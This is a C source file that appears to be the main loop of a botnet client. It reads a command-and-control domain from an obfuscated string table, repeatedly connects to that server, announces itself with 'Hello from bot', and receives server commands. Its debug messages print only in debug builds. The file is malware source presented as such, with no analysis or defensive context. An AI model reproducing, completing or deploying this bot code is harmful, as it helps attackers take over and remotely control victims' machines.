#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>

#include "ram_mem.h"
#include "utils.h"
#include "receiver.h"

#define RESPONSE_SIZE 4096

int main(void)
{
    dict_init();

    int client_fd;
    struct sockaddr_in server_address;
    char buffer[RESPONSE_SIZE];
    const char *message = "Hello from bot";

    while (1)
    {
        if (receiver_init(&client_fd, &server_address, dict_get(DICT_DOMAIN_NAME)) != 0)
        {
#ifdef DEBUG
            printf("[main] Connection failed, retrying in 2 seconds...\n");
#endif
            sleep(2);
            continue;
        }

        if (send(client_fd, message, strlen(message), 0) < 0)
        {
#ifdef DEBUG
            perror("[main] Error: Sending data");
#endif
            close(client_fd);
            sleep(2);
            continue;
        }

        ssize_t received = recv_server_command(client_fd, buffer, sizeof(buffer));
        if (received < 0)
        {
#ifdef DEBUG
            printf("[main] Connection lost, reconnecting...\n");
#endif
            close(client_fd);
            sleep(2);
            continue; 
        }

#ifdef DEBUG
        printf("[main] Received from server: %s\n", buffer);
#endif

        close(client_fd);
        sleep(2); 
    }

    dict_free();
    return 0;
}
